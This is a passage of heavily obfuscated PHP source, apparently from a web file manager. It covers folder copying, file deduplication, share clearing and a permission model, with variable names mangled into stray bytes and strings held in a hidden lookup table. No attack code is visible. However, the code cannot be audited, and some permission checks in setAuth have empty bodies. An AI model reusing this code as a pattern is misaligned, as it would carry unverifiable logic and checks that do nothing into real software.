== $šÚ¶ñ­[$È•¨íàœ[574]]; if (!$ë°€ˆ±ğ && $this->moveClearAuth) { Model($È•¨íàœ[572])->authClear($šì°Œ¹î); } $¦‘ºÜ¶ú = $ë¸½œñË[$È•¨íàœ[508]] == $È•¨íàœ[91] && $šÚ¶ñ­[$È•¨íàœ[508]] != $È•¨íàœ[91]; if ($¦‘ºÜ¶ú) { $é—Ñß¿Ó[$È•¨íàœ[507]] = 0; } if ($˜Ø¾ïâ˜) { $í°‡©ã‰ = array($È•¨íàœ[660] => array($È•¨íàœ[620], $ë¸½œñË[$È•¨íàœ[589]] . $ë¸½œñË[$È•¨íàœ[194]] . $È•¨íàœ[621])); $ñ›×Ì±ó = $ë¸½œñË[$È•¨íàœ[589]] . $ë¸½œñË[$È•¨íàœ[194]] . $È•¨íàœ[50]; $‡€Îå™¹ = $šÚ¶ñ­[$È•¨íàœ[589]] . $šÚ¶ñ­[$È•¨íàœ[194]] . $È•¨íàœ[50] . $ë¸½œñË[$È•¨íàœ[194]] . $È•¨íàœ[50]; $õ·è×ğ™ = array($È•¨íàœ[660] => array($È•¨íàœ[669], "\x72\x65\x70\x6c\141\143\x65\50\160\x61\x72\145\156\x74\114\x65\x76\145\154\x2c\x27{$ñ›×Ì±ó}\47\x2c\x27{$‡€Îå™¹}\x27\51"), $È•¨íàœ[656] => $šÚ¶ñ­[$È•¨íàœ[191]], $È•¨íàœ[657] => $šÚ¶ñ­[$È•¨íàœ[574]]); if ($¦‘ºÜ¶ú) { $õ·è×ğ™[$È•¨íàœ[507]] = 0; } $this->where($í°‡©ã‰)->data($õ·è×ğ™)->save(); } $this->where(array($È•¨íàœ[494] => $šì°Œ¹î))->data($é—Ñß¿Ó)->save(); return $šì°Œ¹î; } private function clearShare($ïØµ”Ê¸, $Ùöú×è) { $ÖœäËúÛ =& $_SERVER[«òÑğ]; $ÉğÓ…à = $this->sourceInfo($ïØµ”Ê¸); $šÍÙó· = $this->sourceInfo($Ùöú×è); if ($ÉğÓ…à[$ÖœäËúÛ[574]] == $šÍÙó·[$ÖœäËúÛ[574]] && $ÉğÓ…à[$ÖœäËúÛ[191]] == $ÖœäËúÛ[670]) { return; } $¨àşÚ« = array($ÖœäËúÛ[589] => array($ÖœäËúÛ[620], $ÉğÓ…à[$ÖœäËúÛ[589]] . $ïØµ”Ê¸ . $ÖœäËúÛ[621])); $ôñ¦ãĞµ = $this->field($ÖœäËúÛ[494])->where($¨àşÚ«)->getField($ÖœäËúÛ[194], !0); if (!$ôñ¦ãĞµ) { return; } $¨àşÚ« = array($ÖœäËúÛ[194] => array($ÖœäËúÛ[7], $ôñ¦ãĞµ), $ÖœäËúÛ[671] => 1); $– Æ·½ = Model($ÖœäËúÛ[672])->field($ÖœäËúÛ[673])->where($¨àşÚ«)->select(); if (!$– Æ·½) { return; } $– Æ·½ = array_to_keyvalue($– Æ·½, $ÖœäËúÛ[12], $ÖœäËúÛ[673]); $¨àşÚ« = array($ÖœäËúÛ[673] => array($ÖœäËúÛ[7], $– Æ·½)); Model($ÖœäËúÛ[672])->where($¨àşÚ«)->save(array($ÖœäËúÛ[671] => 0)); Model($ÖœäËúÛ[674])->where($¨àşÚ«)->delete(); } public function copyFolderFromIO($ÉŞ…ÕËü, $Ş£•Î·‡, $¯ê†Ú¸½, $ÅÎÍí—ñ, $¢ÁêˆØè, $éÖĞ¾Ìœ = false) { $ÄŒÀ†Ìğ =& $_SERVER[«òÑğ]; $ò¤†Ñ = array($ÄŒÀ†Ìğ[638] => array(), $ÄŒÀ†Ìğ[639] => array(), $ÄŒÀ†Ìğ[637] => array(), $ÄŒÀ†Ìğ[675] => array()); $é¾²àí  = $éÖĞ¾Ìœ ? $éÖĞ¾Ìœ : $ÉŞ…ÕËü->pathThis($Ş£•Î·‡); $ú™µÆŸ± = $this->fileNameExist($¯ê†Ú¸½, $é¾²àí ); $Šóæñà = $this->mkdir($¯ê†Ú¸½, $é¾²àí , $ÅÎÍí—ñ); if (!$ú™µÆŸ± || $ÅÎÍí—ñ == REPEAT_RENAME_FOLDER) { $ÅÎÍí—ñ = !1; } if ($ú™µÆŸ±) { $this->_childrenAllMake($ú™µÆŸ±); } Hook::trigger($ÄŒÀ†Ìğ[676]); $this->_copyChildTo($ÉŞ…ÕËü, $Ş£•Î·‡, $Šóæñà, $ÅÎÍí—ñ, $ò¤†Ñ, $¢ÁêˆØè); Hook::trigger($ÄŒÀ†Ìğ[677]); if ($Šóæñà) { $this->folderSizeResetChildren($Šóæñà); } $this->_childrenListClear(); Model($ÄŒÀ†Ìğ[640])->addAll($ò¤†Ñ[$ÄŒÀ†Ìğ[638]], array(), !0); Model($ÄŒÀ†Ìğ[641])->eventCopy($Šóæñà); $this->saveAll($ò¤†Ñ[$ÄŒÀ†Ìğ[639]]); Model($ÄŒÀ†Ìğ[549])->linkAdd($ò¤†Ñ[$ÄŒÀ†Ìğ[637]]); Model($ÄŒÀ†Ìğ[549])->remove($ò¤†Ñ[$ÄŒÀ†Ìğ[675]]); $this->folderSizeReset($¯ê†Ú¸½); $this->updateModifyTime($¯ê†Ú¸½); return $Šóæñà; } private function _copyChildTo($Ì«œÖ“, $¬Í£¹¼¬, $©ÃÈ†î“, $”ÈääşÆ, &$ìÓÔúğÖ, $­Şå¬Ãó) { $ÖÒòó¸¼ =& $_SERVER[«òÑğ]; $¸Ëš¤ú = $this->sourceInfoCache($©ÃÈ†î“); $ñÆ••¿Ú = $Ì«œÖ“->listPath($¬Í£¹¼¬); $ñÆ••¿Ú = $ñÆ••¿Ú ? $ñÆ••¿Ú : array($ÖÒòó¸¼[86] => array(), $ÖÒòó¸¼[85] => array()); $Ëà´Ì¶ = array_merge($ñÆ••¿Ú[$ÖÒòó¸¼[86]], $ñÆ••¿Ú[$ÖÒòó¸¼[85]]); $Äµ¶ÙÑ = $this->_addFiles($Ì«œÖ“, $ñÆ••¿Ú[$ÖÒòó¸¼[86]], $­Şå¬Ãó); $Ê©™ìÏÑ = array(); foreach ($Ëà´Ì¶ as &$‡Œ¾šâ¿) { if (isset($Äµ¶ÙÑ[$‡Œ¾šâ¿[$ÖÒòó¸¼[32]]])) { $‡Œ¾šâ¿ = $Äµ¶ÙÑ[$‡Œ¾šâ¿[$ÖÒòó¸¼[32]]]; } $‡Œ¾šâ¿[$ÖÒòó¸¼[488]] = $‡Œ¾šâ¿[$ÖÒòó¸¼[33]] == $ÖÒòó¸¼[78]; $‡Œ¾šâ¿[$ÖÒòó¸¼[489]] = substr(_get($‡Œ¾šâ¿, $ÖÒòó¸¼[169], $ÖÒòó¸¼[12]), 0, 10); $‡Œ¾šâ¿[$ÖÒòó¸¼[79]] = _get($‡Œ¾šâ¿, $ÖÒòó¸¼[79], 0); $‡Œ¾šâ¿[$ÖÒòó¸¼[546]] = _get($‡Œ¾šâ¿, $ÖÒòó¸¼[546], 0); if (!isset($‡Œ¾šâ¿[$ÖÒòó¸¼[678]]) && $‡Œ¾šâ¿[$ÖÒòó¸¼[546]]) { $ìÓÔúğÖ[$ÖÒòó¸¼[675]][] = $‡Œ¾šâ¿[$ÖÒòó¸¼[546]]; } if ($”ÈääşÆ) { $Ùª„èşä = $this->fileNameExistCache($©ÃÈ†î“, $‡Œ¾šâ¿[$ÖÒòó¸¼[32]]); if ($Ùª„èşä) { if ($‡Œ¾šâ¿[$ÖÒòó¸¼[488]] || $”ÈääşÆ == REPEAT_SKIP) { continue; } if ($”ÈääşÆ == REPEAT_REPLACE) { $÷ÅŞ´ïù = $this->sourceInfoCache($Ùª„èşä); $´Ê„ıä = $this->fileHistory($÷ÅŞ´ïù, $‡Œ¾šâ¿[$ÖÒòó¸¼[546]], $‡Œ¾šâ¿[$ÖÒòó¸¼[79]]); if ($´Ê„ıä) { $ìÓÔúğÖ[$ÖÒòó¸¼[637]][] = $‡Œ¾šâ¿[$ÖÒòó¸¼[546]]; } continue; } else { if ($”ÈääşÆ == REPEAT_RENAME) { $‡Œ¾šâ¿[$ÖÒòó¸¼[32]] = $this->fileNameAutoCache($©ÃÈ†î“, $‡Œ¾šâ¿[$ÖÒòó¸¼[32]], $”ÈääşÆ, !1); } } } } if (!$‡Œ¾šâ¿[$ÖÒòó¸¼[488]] && $‡Œ¾šâ¿[$ÖÒòó¸¼[546]] == 0) { continue; } if (!$‡Œ¾šâ¿[$ÖÒòó¸¼[488]] && $‡Œ¾šâ¿[$ÖÒòó¸¼[546]]) { $ìÓÔúğÖ[$ÖÒòó¸¼[637]][] = $‡Œ¾šâ¿[$ÖÒòó¸¼[546]]; } $Ê©™ìÏÑ[] = $this->_makeItemData($‡Œ¾šâ¿, $¸Ëš¤ú, $‡Œ¾šâ¿[$ÖÒòó¸¼[32]]); } unset($‡Œ¾šâ¿); if (!empty($Ê©™ìÏÑ)) { $this->addAll($Ê©™ìÏÑ); $this->_childrenListSelect($©ÃÈ†î“); } $®Œ«üöù = $this->_childrenList($©ÃÈ†î“); $®Œ«üöù = array_to_keyvalue($®Œ«üöù, $ÖÒòó¸¼[32]); foreach ($Ëà´Ì¶ as $‡Œ¾šâ¿) { $÷ÅŞ´ïù = $®Œ«üöù[$‡Œ¾šâ¿[$ÖÒòó¸¼[32]]]; $ôë­¯ôÉ = $÷ÅŞ´ïù[$ÖÒòó¸¼[194]]; $this->_copyApplyMeta($÷ÅŞ´ïù, $ìÓÔúğÖ); if ($‡Œ¾šâ¿[$ÖÒòó¸¼[33]] == $ÖÒòó¸¼[78]) { $‡Œ¾šâ¿[$ÖÒòó¸¼[87]] = $Ì«œÖ“->getPathInner($‡Œ¾šâ¿[$ÖÒòó¸¼[87]]); $this->_copyChildTo($Ì«œÖ“, $‡Œ¾šâ¿[$ÖÒòó¸¼[87]], $ôë­¯ôÉ, $”ÈääşÆ, $ìÓÔúğÖ, $­Şå¬Ãó); } } } private function _addFiles($¾®ÈÆÕñ, $ŠÃ±Ê, $±“íœ£à) { $›óß€ê² =& $_SERVER[«òÑğ]; if (!$ŠÃ±Ê || count($ŠÃ±Ê) == 0) { return array(); } $«Òóºö = array(); foreach ($ŠÃ±Ê as &$ˆÅøÌÌ³) { Hook::trigger($›óß€ê²[679], $ˆÅøÌÌ³); $ˆÅøÌÌ³[$›óß€ê²[87]] = $¾®ÈÆÕñ->getPathInner($ˆÅøÌÌ³[$›óß€ê²[87]]); $•±›Äøó = $¾®ÈÆÕñ->hashSimple($ˆÅøÌÌ³[$›óß€ê²[87]]); $›·ÒŸ÷û = $¾®ÈÆÕñ->hashMd5($ˆÅøÌÌ³[$›óß€ê²[87]]); if (strlen($›·ÒŸ÷û) > 10 && !isset($«Òóºö[$›·ÒŸ÷û])) { $«Òóºö[$›·ÒŸ÷û] = array(); } $ˆÅøÌÌ³[$›óß€ê²[680]] = $•±›Äøó; $ˆÅøÌÌ³[$›óß€ê²[552]] = $›·ÒŸ÷û; $«Òóºö[$›·ÒŸ÷û][] =& $ˆÅøÌÌ³; if (count($«Òóºö[$›·ÒŸ÷û]) > 1) { $ˆÅøÌÌ³[$›óß€ê²[678]] = !0; } Hook::trigger($›óß€ê²[681], $ˆÅøÌÌ³); } unset($ˆÅøÌÌ³); $êâÖ€ÓÃ = array($›óß€ê²[552] => array($›óß€ê²[7], array_keys($«Òóºö))); $¸©©İ›À = Model($›óß€ê²[682]); $µ©Û¼ = $¸©©İ›À->where($êâÖ€ÓÃ)->select(); $µ©Û¼ = $µ©Û¼ ? $µ©Û¼ : array(); foreach ($µ©Û¼ as $¤ù‡ïçã) { if (!isset($«Òóºö[$¤ù‡ïçã[$›óß€ê²[552]]])) { continue; } $æÄë¤Õ¼ = $«Òóºö[$¤ù‡ïçã[$›óß€ê²[552]]]; foreach ($æÄë¤Õ¼ as &$ˆÅøÌÌ³) { $ˆÅøÌÌ³[$›óß€ê²[546]] = $¤ù‡ïçã[$›óß€ê²[546]]; $ˆÅøÌÌ³[$›óß€ê²[678]] = !0; } unset($ˆÅøÌÌ³); } $·úùì‡Ç = array(); foreach ($ŠÃ±Ê as $™¦ÆÜ¡) { Hook::trigger($›óß€ê²[683], $™¦ÆÜ¡); if (isset($™¦ÆÜ¡[$›óß€ê²[678]]) && $™¦ÆÜ¡[$›óß€ê²[678]]) { Hook::trigger($›óß€ê²[684], $™¦ÆÜ¡); continue; } $úüıìÛÛ = $¾®ÈÆÕñ->getPathInner($™¦ÆÜ¡[$›óß€ê²[87]]); $¿ÜåŒàŒ = $¸©©İ›À->addFileMake($úüıìÛÛ, $™¦ÆÜ¡[$›óß€ê²[79]], $™¦ÆÜ¡[$›óß€ê²[680]], $™¦ÆÜ¡[$›óß€ê²[552]], $™¦ÆÜ¡[$›óß€ê²[32]], $±“íœ£à); Hook::trigger($›óß€ê²[684], $™¦ÆÜ¡); if (!is_array($¿ÜåŒàŒ)) { continue; } $·úùì‡Ç[] = $¿ÜåŒàŒ; } $¸©©İ›À->addAll($·úùì‡Ç); $êâÖ€ÓÃ = array($›óß€ê²[552] => array($›óß€ê²[7], array_keys($«Òóºö))); $µ©Û¼ = $¸©©İ›À->where($êâÖ€ÓÃ)->select(); $µ©Û¼ = $µ©Û¼ ? $µ©Û¼ : array(); foreach ($µ©Û¼ as $¤ù‡ïçã) { if (!isset($«Òóºö[$¤ù‡ïçã[$›óß€ê²[552]]])) { continue; } $Àœïˆ… =& $«Òóºö[$¤ù‡ïçã[$›óß€ê²[552]]]; foreach ($Àœïˆ… as &$ˆÅøÌÌ³) { $ˆÅøÌÌ³[$›óß€ê²[546]] = $¤ù‡ïçã[$›óß€ê²[546]]; } unset($ˆÅøÌÌ³); } $½ì±ü‡‘ = array(); foreach ($ŠÃ±Ê as $‹§ÔËä) { $½ì±ü‡‘[$‹§ÔËä[$›óß€ê²[32]]] = $‹§ÔËä; } return $½ì±ü‡‘; } } define($_SERVER[«òÑğ][685], $_SERVER[«òÑğ][686]); $uvahezlbwn = $_SERVER[«òÑğ][687]; goto cİ¶í„ˆçÕ; aöÖÙ²‡·…: function binCheckBigger($½Ø®ùÛ†, $çÇ´Ãº) { return $½Ø®ùÛ† > $çÇ´Ãº; } $_SERVER[$_SERVER[ó÷»×][3]] = (strrev('4068')."\x38\x35")+0;$_uqhc="0n4dy1kws2e3u58fhcmgprxabqvz6ji9tlo7jz1ghryk2e8bxlifq05cp34davw6u9sntmo7nz7djsw3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Šæø¸ëû, $£ëÉßıˆ) { $™Éøë¹¥ =& $_SERVER[«òÑğ]; if (isset(self::$_methodList[$Šæø¸ëû])) { return @call_user_func_array(self::$_methodList[$Šæø¸ëû], $£ëÉßıˆ); } else { if (method_exists($this, $Šæø¸ëû)) { return call_user_func_array(array($this, $Šæø¸ëû), $£ëÉßıˆ); } else { think_exception(__CLASS__ . $™Éøë¹¥[4] . $Šæø¸ëû . $™Éøë¹¥[5]); } } } public static function __callStatic($Û˜Ôˆ¢†, $öÒö¢á¦) { if (isset(self::$_methodListStatic[$Û˜Ôˆ¢†])) { return call_user_func_array(self::$_methodListStatic[$Û˜Ôˆ¢†], $öÒö¢á¦); } else { if (method_exists(self, $Û˜Ôˆ¢†)) { return call_user_func_array(array(self, $Û˜Ôˆ¢†), $öÒö¢á¦); } else { show_json("{$Û˜Ôˆ¢†}\x28\51\x20\156\157\164\40\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($½Ã§‹¤³, $´¤ôÉ½Ş) { self::$_methodList[$½Ã§‹¤³] = $´¤ôÉ½Ş; } public static function addMethodStatic($‡’•ş, $Øã‡ïô») { self::$_methodListStatic[$‡’•ş] = $Øã‡ïô»; } } goto B”Ö²ªÖï³; D¬ã¬Ú­¿á: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\x63\x65\x5f\141\x75\164\150"; public function getAuth($ò„¼ˆ›µ) { $ÍĞóª¯— =& $_SERVER[«òÑğ]; $öòõî¢Ó = $this->sourceAuthSelect($ò„¼ˆ›µ); $‘¶ş´™´ = array(); $Àûëö±Å = array(); $Õ§µ‰›¨ = 2 << 25; foreach ($öòõî¢Ó as $…¾ıÕç) { $÷²ˆ“„ = Model($ÍĞóª¯—[576])->listData($…¾ıÕç[$ÍĞóª¯—[2093]]); if (!$÷²ˆ“„) { continue; } $‘¶ş´™´[] = $…¾ıÕç; $íˆ„Ÿ›œ = 0; if ($…¾ıÕç[$ÍĞóª¯—[191]] == SourceModel::TYPE_GROUP) { $íˆ„Ÿ›œ = $Õ§µ‰›¨ * 2; } if ($…¾ıÕç[$ÍĞóª¯—[191]] == SourceModel::TYPE_USER) { $íˆ„Ÿ›œ = $Õ§µ‰›¨; } if ($…¾ıÕç[$ÍĞóª¯—[191]] == SourceModel::TYPE_USER && $…¾ıÕç[$ÍĞóª¯—[574]] == $ÍĞóª¯—[231]) { $íˆ„Ÿ›œ = 0; } $Àûëö±Å[] = $÷²ˆ“„[$ÍĞóª¯—[490]] + $íˆ„Ÿ›œ; } array_multisort($Àûëö±Å, SORT_DESC, $‘¶ş´™´); return $‘¶ş´™´; } public function sourceAuthSelect($ÃŞ¹ìÄ) { $‘èÒ½Ì =& $_SERVER[«òÑğ]; static $’ì‚ñí™ = array(); $Á©êœñ = is_array($ÃŞ¹ìÄ) ? !1 : !0; if ($Á©êœñ) { $ÃŞ¹ìÄ = array($ÃŞ¹ìÄ); } $øÒÕ¸¬§ = array(); foreach ($ÃŞ¹ìÄ as $“„ï³ÏÃ) { if (isset($’ì‚ñí™[$“„ï³ÏÃ])) { $øÒÕ¸¬§[$“„ï³ÏÃ] = $’ì‚ñí™[$“„ï³ÏÃ]; } } if (count($øÒÕ¸¬§) == count($ÃŞ¹ìÄ)) { return $Á©êœñ ? $øÒÕ¸¬§[$ÃŞ¹ìÄ[0]] : $øÒÕ¸¬§; } $¾õß˜‰ß = $‘èÒ½Ì[2174]; $˜İšñÎƒ = array($‘èÒ½Ì[194] => array($‘èÒ½Ì[7], $ÃŞ¹ìÄ)); $ºèªµ´ã = $this->field($¾õß˜‰ß)->order($‘èÒ½Ì[478])->where($˜İšñÎƒ)->select(); $ùâ­á = array_to_keyvalue_group($ºèªµ´ã, $‘èÒ½Ì[194]); foreach ($ÃŞ¹ìÄ as $“„ï³ÏÃ) { $’ì‚ñí™[$“„ï³ÏÃ] = $ùâ­á[$“„ï³ÏÃ] ? $ùâ­á[$“„ï³ÏÃ] : array(); } if ($Á©êœñ) { return $ºèªµ´ã; } return $ùâ­á; } public function setAuth($·ì»½Ú¤, $Ãƒ…í¥«) { $‡êœ¸òù =& $_SERVER[«òÑğ]; $ÒÍœÑªÅ = Model($‡êœ¸òù[1431])->sourceInfo($·ì»½Ú¤); if (!$ÒÍœÑªÅ) { return !1; } if ($ÒÍœÑªÅ[$‡êœ¸òù[191]] != SourceModel::TYPE_GROUP) { return !1; } $Ã„˜’Õ = 1; $Ã‘•«‹ß = $ÒÍœÑªÅ[$‡êœ¸òù[574]]; if ($Ã‘•«‹ß != $Ã„˜’Õ) { $”‘ç¸ôå = array($‡êœ¸òù[1985] => $Ã‘•«‹ß); $é÷ã€à¢ = Model($‡êœ¸òù[2079])->field($‡êœ¸òù[1784])->where($”‘ç¸ôå)->select(); $é÷ã€à¢ = array_to_keyvalue($é÷ã€à¢, $‡êœ¸òù[12], $‡êœ¸òù[1784]); } $Ü’‚ïı’ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ªù‡‰Ö’ = array(); foreach ($Ãƒ…í¥« as $Ğ‘ùÆ‹é) { if (!in_array($Ğ‘ùÆ‹é[$‡êœ¸òù[191]], $Ü’‚ïı’)) { show_json(LNG($‡êœ¸òù[2175]), !1); } if ($Ã‘•«‹ß != $Ã„˜’Õ) { if ($Ğ‘ùÆ‹é[$‡êœ¸òù[191]] == SourceModel::TYPE_GROUP) { } if ($Ğ‘ùÆ‹é[$‡êœ¸òù[574]] != 0 && !in_array($Ğ‘ùÆ‹é[$‡êœ¸òù[574]], $é÷ã€à¢)) { } } if ($Ğ‘ùÆ‹é[$‡êœ¸òù[574]] == 0) { $Ğ‘ùÆ‹é[$‡êœ¸òù[191]] = SourceModel::TYPE_USER; } $ªù‡‰Ö’[] = array($‡êœ¸òù[194] => $·ì»½Ú¤, $‡êœ¸òù[191] => intval($Ğ‘ùÆ‹é[$‡êœ¸òù[191]]), $‡êœ¸òù[574] => intval($Ğ‘ùÆ‹é[$‡êœ¸òù[574]]), $‡êœ¸òù[2093] => intval($Ğ‘ùÆ‹é[$‡êœ¸òù[2093]]) ? intval($Ğ‘ùÆ‹é[$‡êœ¸òù[2093]]) : 0, $‡êœ¸òù[2157] => intval($Ğ‘ùÆ‹é[$‡êœ¸òù[2157]]) ? intval($Ğ‘ùÆ‹é[$‡êœ¸òù[2157]]) : -1); } $this->where(array($‡êœ¸òù[494] => $·ì»½Ú¤))->delete(); $this->addAll($ªù‡‰Ö’); return !0; } public function authClear($à²ôÚá§) { $¾øĞ÷ßÊ =& $_SERVER[«òÑğ]; $Ì¶üøú¤ = Model($¾øĞ÷ßÊ[1431])->sourceInfo($à²ôÚá§); $°Îé€» = array($à²ôÚá§); if ($Ì¶üøú¤[$¾øĞ÷ßÊ[488]] == $¾øĞ÷ßÊ[91]) { $úÀö­ä¢ = array($¾øĞ÷ßÊ[660] => array($¾øĞ÷ßÊ[620], $Ì¶üøú¤[$¾øĞ÷ßÊ[589]] . $à²ôÚá§ . $¾øĞ÷ßÊ[621])); $°Îé€» = Model($¾øĞ÷ßÊ[1431])->field($¾øĞ÷ßÊ[494])->where($úÀö­ä¢)->getField($¾øĞ÷ßÊ[194], !0); $°Îé€»[] = $à²ôÚá§; } $this->where(array($¾øĞ÷ßÊ[494] => array($¾øĞ÷ßÊ[495], $°Îé€»)))->delete(); return !0; } public function getAllChildren($ºÚêßı¾) { $óŒÒ˜Çß =& $_SERVER[«òÑğ]; $¦ö€ªóî = Model($óŒÒ˜Çß[1431])->sourceInfo($ºÚêßı¾); if ($¦ö€ªóî[$óŒÒ˜Çß[488]] != $óŒÒ˜Çß[91]) { return $this->sourceListAuth(array($ºÚêßı¾)); } if ($¦ö€ªóî[$óŒÒ˜Çß[191]] != SourceModel::TYPE_GROUP) { return array(); } $Ää™¾È™ = 1; $Şà¶Ä¹ú = array($ºÚêßı¾); if ($¦ö€ªóî[$óŒÒ˜Çß[193]] == $óŒÒ˜Çß[231] && $¦ö€ªóî[$óŒÒ˜Çß[574]] != $Ää™¾È™) { $Şà¶Ä¹ú = $this->groupChidldAllRootSource($¦ö€ªóî[$óŒÒ˜Çß[574]]); } $®òßÊ™ = $this->field($óŒÒ˜Çß[194])->group($óŒÒ˜Çß[194])->select(); $®òßÊ™ = array_to_keyvalue($®òßÊ™, $óŒÒ˜Çß[12], $óŒÒ˜Çß[194]); if (!$®òßÊ™) { return array(); } $ûŒ¯¹àù = $óŒÒ˜Çß[2176]; $— ¦Şíª = array($óŒÒ˜Çß[194] => array($óŒÒ˜Çß[7], $®òßÊ™), $óŒÒ˜Çß[508] => $óŒÒ˜Çß[231]); $³˜ÃÎÇÛ = Model($óŒÒ˜Çß[914])->field($ûŒ¯¹àù)->where($— ¦Şíª)->select(); $¹½õ¢ãÇ = array($ºÚêßı¾); foreach ($³˜ÃÎÇÛ as $¨ñïõ’‹) { foreach ($Şà¶Ä¹ú as $ÆÁÉÙ¢‹) { $—Å’í„³ = $óŒÒ˜Çß[50] . $ÆÁÉÙ¢‹ . $óŒÒ˜Çß[50]; $Î¦¸Ó÷ş = $¨ñïõ’‹[$óŒÒ˜Çß[589]] . $¨ñïõ’‹[$óŒÒ˜Çß[194]] . $óŒÒ˜Çß[50]; if (strstr($Î¦¸Ó÷ş, $—Å’í„³)) { $¹½õ¢ãÇ[] = $¨ñïõ’‹[$óŒÒ˜Çß[194]]; break; } } } return $this->sourceListAuth($¹½õ¢ãÇ); } private function sourceListAuth($™›Ï‰üİ) { $†Å Şé… =& $_SERVER[«òÑğ]; $àÃ¾‚ = Model($†Å Şé…[1431])->sourceListInfo($™›Ï‰üİ, !0); $à¶ô­ë¢ = $this->sourceAuthSelect($™›Ï‰üİ); $ˆ‰ûóá = array(); $³ª¯èñÆ = array(); foreach ($àÃ¾‚ as $‰Ò ±ªŠ) { unset($‰Ò ±ªŠ[$†Å Şé…[532]]); unset($‰Ò ±ªŠ[$†Å Şé…[530]]); unset($‰Ò ±ªŠ[$†Å Şé…[490]]); unset($‰Ò ±ªŠ[$†Å Şé…[90]]); $ç¬—º‹ = $à¶ô­ë¢[$‰Ò ±ªŠ[$†Å Şé…[194]]]; if (!$ç¬—º‹) { continue; } $‰Ò ±ªŠ[$†Å Şé…[2177]] = $this->authTargetInfo($ç¬—º‹); $‰Ò ±ªŠ[$†Å Şé…[587]] = rtrim($‰Ò ±ªŠ[$†Å Şé…[593]], $†Å Şé…[8]) . $†Å Şé…[8] . ltrim($‰Ò ±ªŠ[$†Å Şé…[587]], $†Å Şé…[8]); $ˆ‰ûóá[] = $‰Ò ±ªŠ; $ ş‹Ÿ‡Ø = count(explode($†Å Şé…[8], trim($‰Ò ±ªŠ[$†Å Şé…[587]], $†Å Şé…[8]))); $³ª¯èñÆ[] = $ ş‹Ÿ‡Ø + ($‰Ò ±ªŠ[$†Å Şé…[33]] == $†Å Şé…[78] ? 0 : 1000); } array_multisort($³ª¯èñÆ, SORT_ASC, $ˆ‰ûóá); return $ˆ‰ûóá; } private function groupChidldAllRootSource($‚‰¶œÙ) { $ºîå¸” =& $_SERVER[«òÑğ]; $ŒÇÑÛÏ˜ = Model($ºîå¸”[2178])->groupChildrenAll($‚‰¶œÙ); $ºõÂ¼ë’ = array($ºîå¸”[193] => 0, $ºîå¸”[574] => array($ºîå¸”[7], $ŒÇÑÛÏ˜), $ºîå¸”[191] => SourceModel::TYPE_GROUP); $‡÷áäõ = Model($ºîå¸”[914])->field($ºîå¸”[194])->where($ºõÂ¼ë’)->select(); $‡÷áäõ = array_to_keyvalue($‡÷áäõ, $ºîå¸”[12], $ºîå¸”[194]); return $‡÷áäõ; } private function authTargetInfo($äî¥ï¥õ) { $ÏÌŒòäë =& $_SERVER[«òÑğ]; $’¨‹­ó­ = array(); $¼Ûç³µ = array(); $­Ôá¼“ = 2 << 25; foreach ($äî¥ï¥õ as $·›Ó®°Ç) { $¦è‡ê”± = Model($ÏÌŒòäë[576])->listData($·›Ó®°Ç[$ÏÌŒòäë[2093]]); if (!$¦è‡ê”±) { continue; } if ($·›Ó®°Ç[$ÏÌŒòäë[191]] == SourceModel::TYPE_USER) { $³ÊÇ± = Model($ÏÌŒòäë[582])->getInfoSimpleOuter($·›Ó®°Ç[$ÏÌŒòäë[574]]); if ($³ÊÇ±[$ÏÌŒòäë[1784]] == $ÏÌŒòäë[1283]) { continue; } if ($³ÊÇ±[$ÏÌŒòäë[1784]] == $ÏÌŒòäë[231]) { $³ÊÇ±[$ÏÌŒòäë[32]] = LNG($ÏÌŒòäë[2179]); } } else { $³ÊÇ± = Model($ÏÌŒòäë[590])->getInfoSimple($·›Ó®°Ç[$ÏÌŒòäë[574]]); } if (!$³ÊÇ±) { continue; } $³ÊÇ±[$ÏÌŒòäë[545]] = $¦è‡ê”±; $’¨‹­ó­[] = $³ÊÇ±; $Æ¶³ï¤Ä = 0; if ($·›Ó®°Ç[$ÏÌŒòäë[191]] == SourceModel::TYPE_GROUP) { $Æ¶³ï¤Ä = $­Ôá¼“ * 2; } if ($·›Ó®°Ç[$ÏÌŒòäë[191]] == SourceModel::TYPE_USER) { $Æ¶³ï¤Ä = $­Ôá¼“; } if ($·›Ó®°Ç[$ÏÌŒòäë[191]] == SourceModel::TYPE_USER && $·›Ó®°Ç[$ÏÌŒòäë[574]] == $ÏÌŒòäë[231]) { $Æ¶³ï¤Ä = 0; } $¼Ûç³µ[] = $¦è‡ê”±[$ÏÌŒòäë[490]] + $Æ¶³ï¤Ä; } array_multisort($¼Ûç³µ, SORT_DESC, $’¨‹­ó­); return $’¨‹­ó­; } public function getAllChildrenByUser($­†£µĞ, $Š€œ÷óÅ) { $Ù£¬Ä‘Ä =& $_SERVER[«òÑğ]; $Ãò©… = Model($Ù£¬Ä‘Ä[602])->getInfo($Š€œ÷óÅ); if (!$Š€œ÷óÅ || !$­†£µĞ || !$Ãò©…) { return array(); } $µ…÷¸“ = Model($Ù£¬Ä‘Ä[1431])->sourceInfo($­†£µĞ); $¡íÜ°ù = array(); $ ›áŸ = 1; if ($µ…÷¸“[$Ù£¬Ä‘Ä[193]] == $Ù£¬Ä‘Ä[231] && $µ…÷¸“[$Ù£¬Ä‘Ä[574]] != $ ›áŸ && $this->groupContainUser($µ…÷¸“[$Ù£¬Ä‘Ä[574]], $Š€œ÷óÅ)) { foreach ($Ãò©…[$Ù£¬Ä‘Ä[2180]] as $»‹æ¶é) { $–Ã£º²ñ = Model($Ù£¬Ä‘Ä[590])->getInfo($»‹æ¶é[$Ù£¬Ä‘Ä[1985]]); $Œåó•¨¢ = Model($Ù£¬Ä‘Ä[602])->getInfoSimpleOuter($Š€œ÷óÅ); $Œåó•¨¢[$Ù£¬Ä‘Ä[545]] = $»‹æ¶é[$Ù£¬Ä‘Ä[490]]; if (Model($Ù£¬Ä‘Ä[576])->authCheckAction($»‹æ¶é[$Ù£¬Ä‘Ä[490]][$Ù£¬Ä‘Ä[490]], $Ù£¬Ä‘Ä[2006])) { continue; } $ªêàİœŒ = array($Ù£¬Ä‘Ä[32] => $Ù£¬Ä‘Ä[1303] . $–Ã£º²ñ[$Ù£¬Ä‘Ä[32]], $Ù£¬Ä‘Ä[194] => $–Ã£º²ñ[$Ù£¬Ä‘Ä[90]][$Ù£¬Ä‘Ä[194]], $Ù£¬Ä‘Ä[87] 